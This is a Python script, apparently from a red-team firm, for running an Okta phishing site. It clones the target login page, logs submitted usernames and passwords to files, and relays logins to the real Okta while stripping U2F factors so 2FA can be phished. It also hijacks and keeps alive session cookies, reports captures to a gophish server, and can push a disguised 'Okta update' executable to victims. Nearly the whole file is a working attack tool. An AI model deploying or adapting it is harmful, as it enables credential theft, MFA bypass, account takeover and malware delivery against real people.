###############################################################################
#                                                                             #
#                            Okta Phishing Setup Script                       #
#       Purpose: Setting up Okta phishing site for stealing creds             #
#       Author: Alex Bainbridge, Alex.Bainbridge@praetorian.com               #
#               Robert Leonard, Robert.Leonard@praetorian.com                 #
#       Requirements: SSL Cert and Key, ports 443 and 4158                    #
#       Options: "Update" payload distribution, gophish tracking              #
#                                                                             #
###############################################################################

from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
from SocketServer import ThreadingMixIn
from threading import Lock, Thread
from urlparse import urlparse
import SocketServer
import simplejson
import threading
import optparse
import datetime
import requests
import urllib2
import Cookie
import random
import string
import signal
import bleach
import json
import time
import ssl
import sys
import os
import re


global users, guppies, basses, twonas, oktapuses, die, die_lock, lock
lock = Lock()
users = {}
guppies = 0
basses = 0
twonas = 0
oktapuses = 0
die = False
die_lock = Lock()
headers = {'Accept': 'application/json', 'Content-Type': 'application/json'}


help_usage = """usage: %prog [options] target_okta_url replace_okta_url cert.pem key.pem\n
ex. %prog -q https://praetorianlabs.okta.com http://myphish.okta.com cert.pem key.pem"""
parser = optparse.OptionParser(usage=help_usage,
								version="%prog 1.0")

parser.add_option('-q', '--quiet',
    action="store_true", dest="quiet_mode",
    help="don't print status messages to stdout", default=False)

parser.add_option('-o', '--out-file',
    action="store", dest="log_file",
    help="destination of log file for writing setup logs", default="")

parser.add_option('-g', '--go-phish',
    action="store", dest="go_phish",
    help="location of gophish listener", default="")

parser.add_option('-p', '--payload',
    action="store", dest="payload",
    help="location of payload to download to users desktop. Named 'okta_web_update'", default="")

parser.add_option('-x', '--extension',
    action="store", dest="extension",
    help="extension for payload option. Default: 'exe", default="exe")

parser.add_option('-c', '--content-type',
    action="store", dest="content_type",
    help="content type for payload. Default: 'application/octet-stream'", default="application/octet-stream")

(options, args) = parser.parse_args()

#For the result server
def signal_handler(signal, frame):
		global die_lock, die
		die_lock.acquire()
		die = True
		die_lock.release()
		requests.get("https://127.0.0.1:4158/wateringhole", verify=False)
		sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)


def log_print(string):
	if(options.log_file != ""):
		try:
			with open(options.log_file, 'a') as log:
				log.write(string)
				log.write("\n")
		except IOError as e:
			if(not options.quiet_mode):
				print("outfile could not be opened: " + options.log_file)

def quiet_print(string, log = False):
	if(log):
		log_print(string)
	if(options.quiet_mode):
		return
	else:
		print(string)

def download_site():
	quiet_print("Downloading index.html...", True)
	response = urllib2.urlopen(args[0])
	webContent = response.read()
	if not os.path.exists(os.path.dirname("webroot/index.html")):
	    try:
	        os.makedirs(os.path.dirname("webroot/index.html"))
	    except OSError as exc: # Guard against race condition
	        if exc.errno != errno.EEXIST:
	            raise
	if not os.path.exists(os.path.dirname("webroot/errors/auth.error")):
	    try:
	        os.makedirs(os.path.dirname("webroot/errors/auth.error"))
	    except OSError as exc: # Guard against race condition
	        if exc.errno != errno.EEXIST:
	            raise
	if not os.path.exists(os.path.dirname("stolen_info/")):
	    try:
	        os.makedirs(os.path.dirname("stolen_info/"))
	    except OSError as exc: # Guard against race condition
	        if exc.errno != errno.EEXIST:
	            raise
	with open("webroot/index.html", 'w+') as index:
		index.write(webContent)

	quiet_print("Downloading 404.html...", True)
	response = requests.get(args[0] + "/404")
	webContent = response.content
	with open("webroot/errors/404.html", 'w+') as error:
		error.write(webContent)

	quiet_print("Dropping common error code...", True)
	with open("webroot/errors/auth.error", 'w+') as error:
		error.write("""{"errorCode":"E0000004","errorSummary":"Authentication failed","errorLink":"E0000004",
			"errorId":"oaepFYjhiBMQGOTJcyx6_gQ9Q","errorCauses":[]}""")

	try:
		if(options.payload != ""):
			quiet_print("Copying Payload...", True)
			with open(options.payload, 'r') as infile:
				with open("webroot/okta_update", 'w+') as outfile:
					outfile.write(infile.read())
			quiet_print("Setting up Updater...", True)
			with open("webroot/update-okta-web", 'w+') as update:
				update.write("""
					<!DOCTYPE html>
					<html><head><script>
					    function downloadURI(uri, name) {
					    var link = document.createElement("a");
					    link.download = name;
					    link.href = uri;
					    document.body.appendChild(link);
					    link.click();
					    document.body.removeChild(link);
					    delete link;
					    window.location = \"""" + args[0] + """\";
					  }
					</script>
					</head>

				<body onload='downloadURI(\""""+ args[1]+ """/download-update", "okta_web_update.""" + options.extension + """\")'>
				</body>
				</html>""")
	except IOError as e:
		quiet_print("--IO Error: " + str(e), True)
		quiet_print("--Exiting...", True)
		exit(1)



def encode_replacement(replace_url):
	return_string = ""
	for char in replace_url:
		if(not(char.isdigit() or char.isalpha())):
			return_string = return_string + "\\x" + char.encode("hex")
		else:
			return_string = return_string + char
	return return_string


def modify_index():
	quiet_print("Modifying index.html...", True)
	target_re = re.match('(https?://)(.*)', args[0])
	
	with open("webroot/index.html", 'r+') as index:
		index_content = index.read()
		base_url_replace = "var baseUrl = '" + encode_replacement(args[1]) + "'\n"
		index_content_new = re.sub("var baseUrl = .*\n", base_url_replace, index_content)
		index.seek(0)
		index.write(index_content_new)
		index.truncate()
		index.close()


def main():
  	if(len(args) != 4):
  		quiet_print("Wrong number of arguments", True)
  		parser.print_help()
  		quiet_print("Exiting", True)
  		exit(1)
  	ts = time.time()
  	start_time = datetime.datetime.fromtimestamp(ts).strftime('%Y-%m-%d %H:%M:%S')
  	log_print(  "----------------------------------------")
  	quiet_print("-------------Starting Setup-------------", True)
  	quiet_print("----------" + start_time  + "-----------", True)
  	log_print(  "----------------------------------------")
  	download = requests.Session()
  	live_check = download.get(args[0])
  	if(live_check.status_code != 200):
  		quiet_print("Host: " + args[0] + " failed live (200) check", True)
  		quiet_print("Exiting...", True)
  		exit(1)

  	download_site()
  	modify_index()
  	quiet_print("-------------Setup Complete-------------", True)
  	quiet_print("-------------Starting Server------------", True)
  	start_server()


class user_profile:
	def __init__(self):
		self.state = ["Visited"]
		self.username = []
		self.password = []
		self.sessions = []

	def add_state(self, new_state):
		self.state.append(new_state)

	def add_username(self, new_username):
		self.username.append(new_username)

	def add_password(self, new_password):
		self.password.append(new_password)

	def add_session(self, req_sesh):
		self.sessions.append(req_sesh)


class Results(BaseHTTPRequestHandler):
	def log_message(self, format, *args):
		return

	def _set_headers(self, code):
		self.send_response(code)
		self.send_header('Content-type', 'text/html')
		self.send_header("Connection", "close")
		self.end_headers()

	def get_status(self, rid):
		user = users[rid]
		if "Okta" in user.state:
			return "Oktapus"
		elif "TFA" in user.state:
			return "Twona"
		elif "Password" in user.state:
			return "Bass"
		else:
			return "Guppy"

	def do_GET(self):
		if self.path == "/wateringhole":
			self._set_headers(200)
			self.wfile.write("<html><body><h1>Results</h1>\n")
			self.wfile.write("<h3>Guppies: " + str(guppies) + "</h3>\n")
			self.wfile.write("<h3>Basses: " + str(basses) + "</h3>\n")
			self.wfile.write("<h3>Twonas: " + str(twonas) + "</h3>\n")
			self.wfile.write("<h3>Oktapuses: " + str(oktapuses) + "</h3>\n")
			self.wfile.write("<hr> </br>")
			for rid in users:
				self.wfile.write("<b>User: </b>" + rid + "&nbsp;&nbsp;&nbsp;&nbsp;")
				self.wfile.write("<b>Status: </b>" + self.get_status(rid) + "</br>")
				self.wfile.write("<b>Usernames: </b>" + bleach.clean(' '.join(users[rid].username)) + "</br>")
				self.wfile.write("<b>Passwords: </b>" + bleach.clean(' '.join(users[rid].password)) + "</br>")
				self.wfile.write("<b>Sessions: </b>")
				for (req_sesh) in users[rid].sessions:
					self.wfile.write(bleach.clean(req_sesh.cookies['sid']))
				self.wfile.write("</br> </br>")
				self.wfile.write("<hr> </br>")

			self.wfile.write("</body></html>")
		else:
			return


class S(BaseHTTPRequestHandler):
	def log_message(self, format, *args):
		if(options.quiet_mode):
			return
		else:
			sys.stderr.write("%s - - [%s] %s\n" %
				(self.address_string(),
				self.log_date_time_string(),
				format%args))

	def _set_headers(self, code):
		self.send_response(code)
		self.send_header('Content-type', 'text/html')
		self.send_header("Connection", "close")
        
	def do_OPTIONS(self):
		self.send_response(200, "ok")
		self.send_header('Access-Control-Allow-Credentials', 'true')
		self.send_header('Access-Control-Allow-Origin', args[1])
		self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
		self.send_header("Access-Control-Allow-Headers", "X-Requested-With, Content-type")
		self.send_header("Connection", "close")
		self.end_headers()

	def do_HEAD(self):
		self._set_headers(200)
		self.end_headers()

	def serve_file(self, filename):
		with open("webroot/" + filename, 'r') as file:
			self.wfile.write(file.read())

	def get_rid_cookie(self):
		cookies = self.headers.get('Cookie')
		rid = ""
		if cookies:
			stub = Cookie.BaseCookie(cookies).get('rid')
			if stub:
				rid = stub.value
		return rid

	def get_jsesh_cookie(self):
		cookies = self.headers.get('Cookie')
		jsesh = ""
		if cookies:
			stub = Cookie.BaseCookie(cookies).get('JSESSIONID')
			if stub:
				jsesh = stub.value
		return jsesh

	def generate_rid(self):
		return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(20))

	def serve_update(self):
		self.send_response(200)
		self.send_header('Content-type', 'text/html')
		self.send_header("Connection", "close")
		self.serve_file("update-okta-web")

	def do_GET(self):
		global users, guppies, basses, twonas, oktapuses, lock 
		self.parsed_uri = urlparse(self.path)
		try:
			if(self.path == "/update-okta-web" and options.payload != ""):
				self.serve_update()
				return

			elif(self.path == "/download-update" and options.payload != ""):
				self.send_response(200)
				self.send_header('Content-type', options.content_type)
				self.send_header('Content-Length', os.stat("webroot/okta_update").st_size)
				self.send_header("Connection", "close")
				self.end_headers()

				with open("webroot/okta_update", 'rb') as file:
					self.wfile.write(file.read())
				return

			if (self.parsed_uri.path == "/" or self.parsed_uri.path == "/index.html"):
				if(self.parsed_uri.query.split("&")[0].split("=")[0] == "rid"):
					#Rid in url
					rid = self.parsed_uri.query.split("&")[0].split("=")[1]
					requests.get(options.go_phish + "/?rid=" + rid, verify=False)
				else:
					#Rid could be in cookie
					rid = self.get_rid_cookie()
				
				if rid == "":
					#No Rid found, make one
					rid = self.generate_rid()
				

				lock.acquire()
				if(not rid in users):
					#New user
					new_user = user_profile()
					guppies += 1
					users[rid] = new_user
					quiet_print("Landed Guppy: " + rid, True)

				lock.release()
				self._set_headers(200)
				self.send_header('Set-Cookie', 'rid=' + rid)
				self.end_headers()
				self.serve_file("index.html")
				
			elif ("sessionCookieRedirect" in self.path):
				jsesh = self.get_jsesh_cookie()
				(session, response) = get_okta_session(self.path, jsesh)
				sid = None
				with open("stolen_info/session_cookie.txt", "a") as outfile:
					for header in response.headers:
						outfile.write(header + ":" + response.headers[header] + "\n")
						if(response.cookies['sid'] != None and response.cookies['sid'] != ""):
							sid = response.cookies['sid']
					outfile.write("\n\n\n")

				rid = self.get_rid_cookie()
				if (rid != None and sid != None and rid != "" and sid != ""):
					quiet_print("Landed Oktapus: " + rid, True)
					lock.acquire()
					oktapuses += 1
					user_prof = users[rid]
					user_prof.add_state("Okta")
					user_prof.add_session(session)
					users[rid] = user_prof
					lock.release()

				if(options.payload != ""):
					self.serve_update()
					return
				else:
					self.send_response(301)
					self.send_header("Connection", "close")
					self.send_header('Location', args[0])
					self.end_headers()
			else:
				self._set_headers(404)
				self.end_headers()
				self.serve_file("errors/404.html")
        
		except Exception as e:
			quiet_print("--Error: " + str(e), True)
			self.serve_file("index.html")
     
	def send_sign_on_error(self):
		self.send_response(401)
		self.send_header('Content-type', "application/json;charset=UTF-8")
		self.send_header("Connection", "close")
		self.end_headers()
		self.serve_file("errors/auth.error")
		self.wfile.write("\n")

	def do_POST(self):
		global users, guppies, basses, twonas, oktapuses, lock
		try:
			self.parsed_uri = urlparse(self.path)
			if(self.path == "/api/v1/authn"):
				self.data_string = self.rfile.read(int(self.headers['Content-Length']))
				data = simplejson.loads(self.data_string)
				with open("stolen_info/creds.txt", "a") as outfile:
					simplejson.dump(data, outfile)
					outfile.write("\n\n")
				try:
					rid = self.get_rid_cookie()
					if (rid != None and rid != ""):
						quiet_print("Landed Bass: " + rid, True)
						lock.acquire()
						basses += 1
						user_prof = users[rid]
						user_prof.add_state("Password")
						user_prof.add_username(data["username"])
						user_prof.add_password(data["password"])
						users[rid] = user_prof
						lock.release()
						requests.post(options.go_phish + "/?rid=" + rid + "&username=" + data["username"] + "&password=" + data["password"], verify=False)
 				except Exception:
					log_print("Go phish not reachable")
                

				response = okta_authenticate(data["username"], data["password"])
				if(response.status_code != 200):
					self.send_sign_on_error()
					return


				j = json.loads(response.content)
				
				if('factors' in j['_embedded']):
					new_factors = []
					for i in range(0, len(j['_embedded']['factors'])):
						if(j['_embedded']['factors'][i]['factorType'] != 'u2f'):
							new_factors.append(j['_embedded']['factors'][i])

					j['_embedded']['factors'] = new_factors
					if(len(new_factors) == 0):
						quiet_print("Appears that only U2F-2FA factors are used", True)

				bypass = json.dumps(j)
				bypass = bypass.replace(args[0], args[1])
				with open("stolen_info/bypass.txt", "a") as outfile:
					outfile.write(bypass)
					outfile.write("\n\n")

				self.send_response(200)
				for header in response.headers:
					if(header.lower() == "connection" or header.lower() == "content-length" or header.lower() == 'content-encoding'):
						continue    
					else:
						self.send_header(header, response.headers[header])
				self.send_header("Connection", "close")
				self.end_headers()
				self.wfile.write(bypass)
				self.wfile.write('\r\n')
				return            
			else:
				#Assume 2factor, pass to their Okta
				self.data_string = self.rfile.read(int(self.headers['Content-Length']))
				data = simplejson.loads(self.data_string)
				response = handle_mfa_verify(self.path, data)
				new_content = response.content.replace(args[0], args[1])

				rid = self.get_rid_cookie()
				if (rid != None and rid != ""):
					quiet_print("Landed Twona: " + rid, True)
					lock.acquire()
					twonas += 1
					user_prof = users[rid]
					user_prof.add_state("TFA")
					users[rid] = user_prof
					lock.release()

				if(response.status_code != 400):
					self.send_response(response.status_code)
					for header in response.headers:
						if(header.lower() == "set-cookie"):
							#Weird line break was happening
							cookies = response.headers['Set-Cookie'].split("JSESSIONID")
							self.send_header(header, cookies[0])
							self.send_header(header, "JSESSIONID" + cookies[1])
						elif(header.lower() == "content-encoding"):
							continue;
						else:
							self.send_header(header, response.headers[header])
					self.send_header("Connection", "close")
					self.end_headers()
					self.wfile.write(new_content)
					self.wfile.write('\r\n')
					return
				else:
					self.send_sign_on_error()
					return
        
		except Exception as e:
			quiet_print("--Error: " + str(e), True)
			self.send_sign_on_error()


class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
        """Handle requests in a separate thread."""

def get_okta_session(url, JSESSION_ID):
	cookies = {'JSESSIONID': JSESSION_ID}
	s = requests.Session()
	r = s.get(args[0] + url, headers=headers, cookies=cookies, allow_redirects=False)
	return (s, r) 

def okta_authenticate(username, password):
	data = {'usrname': username, 'password': password, 'relayState': '/app/userHome#', 'options': {'multiOptionalFactorEnroll': 'false', 'warnBeforePasswordExpired': 'false'}}
	response = requests.post('{}/api/v1/authn'.format(args[0]), headers=headers, json=data)		
	return response

def handle_mfa_verify(slug, data):
	response = requests.post(args[0] + slug, headers=headers, json=data)
	return response


def sessions_management():
	while True:
		die_lock.acquire()
		if die:
			die_lock.release()
			sys.exit(0)
		die_lock.release()

	    lock.acquire()
	    for rid in users:
	    	user = users[rid]
	    	for sesh in user.sessions:
	    		#4 seconds + jitter
	        	time.sleep(4 + random.randint(0,20))
	        	sesh.get(args[0])
	    lock.release()
	    #5 minutes + jitter
	    time.sleep((5 * 60) + random.randint(0,2 * 60))


def result_server(handler_class=Results, port=4158):
	server_address = ('', port)
	httpd = ThreadedHTTPServer(server_address, handler_class)
	httpd.socket = ssl.wrap_socket (httpd.socket, certfile=args[2], keyfile=args[3], server_side=True, ssl_version=ssl.PROTOCOL_TLSv1_2)
	global die_lock, die
	while True:
		die_lock.acquire()
		if die:
			die_lock.release()
			sys.exit(0)
		else:
			die_lock.release()
			httpd.handle_request()
	


        
def start_server(handler_class=S, port=4298):
	server_address = ('', port)
	httpd = ThreadedHTTPServer(server_address, handler_class)
	httpd.socket = ssl.wrap_socket (httpd.socket, certfile=args[2], keyfile=args[3], server_side=True, ssl_version=ssl.PROTOCOL_TLSv1_2)
	res = Thread(target = result_server, args = [])
	res.start()
	ses = Thread(target = sessions_management, args = [])
	ses.start()

	httpd.serve_forever()


if __name__ == '__main__':
	main()

